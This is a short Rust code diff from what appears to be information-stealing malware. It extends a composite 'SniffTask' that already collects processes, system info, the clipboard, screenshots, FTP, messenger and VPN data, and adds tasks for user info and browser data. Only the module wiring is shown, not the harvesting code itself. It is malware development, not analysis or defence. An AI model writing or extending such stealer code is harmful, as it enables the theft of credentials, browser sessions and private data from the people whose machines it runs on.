@@ -6,16 +6,19 @@ mod clipboard;
 mod processes;
 mod screenshot;
 mod systeminfo;
+mod userinfo;
 
 use crate::clipboard::ClipboardTask;
 use crate::processes::ProcessesTask;
 use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
+use crate::userinfo::UserInfoTask;
 use alloc::vec;
+use vpn::VpnTask;
+use browsers::BrowsersTask;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
-use vpn::VpnTask;
 
 pub struct SniffTask {
     inner: CompositeTask
@@ -29,9 +32,11 @@ impl SniffTask {
                 ProcessesTask,
                 SystemInfoTask,
                 ClipboardTask,
+                UserInfoTask,
                 FtpTask::new(),
                 MessengersTask::new(),
-                VpnTask::new()
+                VpnTask::new(),
+                BrowsersTask::new(),
             )
         }
     }
